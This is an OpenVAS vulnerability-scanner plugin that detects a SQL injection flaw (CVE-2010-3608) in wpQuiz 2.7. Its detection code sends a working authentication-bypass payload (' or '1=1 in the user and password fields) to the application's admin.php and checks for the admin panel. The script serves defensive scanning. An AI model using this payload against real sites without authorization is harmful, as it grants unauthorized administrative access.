##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wpquiz_mult_sql_inj_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# wpQuiz Multiple SQL Injection Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to compromise the
  application, access or modify data, or exploit latent vulnerabilities in the
  underlying database.
  Impact Level: Application.";
tag_affected = "wpQuiz version 2.7";

tag_insight = "Input passed to the 'id' and 'password' parameters in 'admin.php' and
  'user.php' scripts are not properly sanitised before being returned to the
  user.";
tag_solution = "No solution or patch is available as of 28th September, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://webscripts.softpedia.com/script/Quizz/wpQuiz-41098.html";
tag_summary = "This host is running wpQuiz and is prone multiple SQL Injection
  vulnerabilities";

if(description)
{
  script_id(902315);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-09-29 09:26:02 +0200 (Wed, 29 Sep 2010)");
  script_cve_id("CVE-2010-3608");
  script_bugtraq_id(43384);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("wpQuiz Multiple SQL Injection Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15075/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/1009-exploits/wpquiz27-sql.txt");

  script_description(desc);
  script_summary("Check wpQuiz is vulnerable to SQL injection attack");
  script_category(ACT_GATHER_INFO);
  script_copyright("Copyright (c) 2010 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP port
wpPort = get_http_port(default:80);
if(!get_port_state(wpPort)){
  exit(0);
}

foreach dir (make_list("/wp_quiz", "/wpQuiz", "/", cgi_dirs()))
{
  ## Send and Receive Response
  sndReq = http_get(item:string(dir , "/upload/index.php"), port:wpPort);
  rcvRes = http_send_recv(port:wpPort, data:sndReq);

  ## Check application is wpQuiz
  if("<title>wpQuiz >> Login - wpQuiz</title>" >< rcvRes)
  {
    ## Try an exploit
    filename = string(dir + "/upload/admin.php");
    host = get_host_name();
    authVariables ="user=%27+or+%271%3D1&pass=%27+or+%271%3D1";

    ## Construct post request
    sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                   "Host: ", host, "\r\n",
                   "Referer: http://", host, filename, "\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n",
                   "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                   authVariables);
    rcvRes = http_keepalive_send_recv(port:wpPort, data:sndReq);

    ## Check the Response to confirm vulnerability
    if(">Administration Panel" >< rcvRes || "AdminCP" >< rcvRes)
    {
      security_hole(wpPort);
      exit(0);
    }
  }
}
